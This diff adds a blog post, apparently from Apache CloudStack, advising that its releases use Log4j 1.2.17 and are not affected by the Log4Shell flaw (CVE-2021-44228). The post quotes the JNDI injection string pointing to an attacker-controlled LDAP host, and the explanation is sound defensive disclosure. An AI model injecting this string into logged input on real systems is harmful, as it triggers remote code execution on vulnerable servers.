@@ -1,0 +1,16 @@
+---
+layout: post
+title: CloudStack Advisory on Apache Log4j Zero Day (CVE-2021-44228)
+date: '2021-12-13T11:12:50+00:00'
+permalink: log4jshell
+---
+On 9th December 2021, a new zero-day vulnerability for Apache Log4j was reported. It is by now tracked under CVE-2021-44228:
+<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228</a>.
+
+CVE-2021-44228 vulnerability is classified under the highest severity mark and allows an attacker to execute arbitrary code by injecting a sub-string in the form "${jndi:ldap://some.attacker-controlled.site/}" into a logged message. Apache Log4j 2.x is reported to be affected as it performs a lookup (string substitution) using the JNDI protocol, whenever the "${jndi:...}" string is found within a message parameter.
+
+The Apache <a href="https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126">Log4j developers</a> and the <a href="http://slf4j.org/log4shell.html">SLF4J project advisory</a> confirm that Apache Log4j 1.x does not offer a look-up mechanism and does not suffer remote code execution (RCE) vulnerability from CVE-2021-44228.
+
+All Apache CloudStack releases since v4.6 use Apache Log4j version 1.2.17 and therefore are not affected by this RCE vulnerability. Most users who haven't changed the default log4j xml config don't need to do anything, advanced users can check and fix their log4j xml configuration if they're using any custom JMS appenders.
+
+The Apache CloudStack project will consider migrating to a different version of Apache Log4j in future releases.
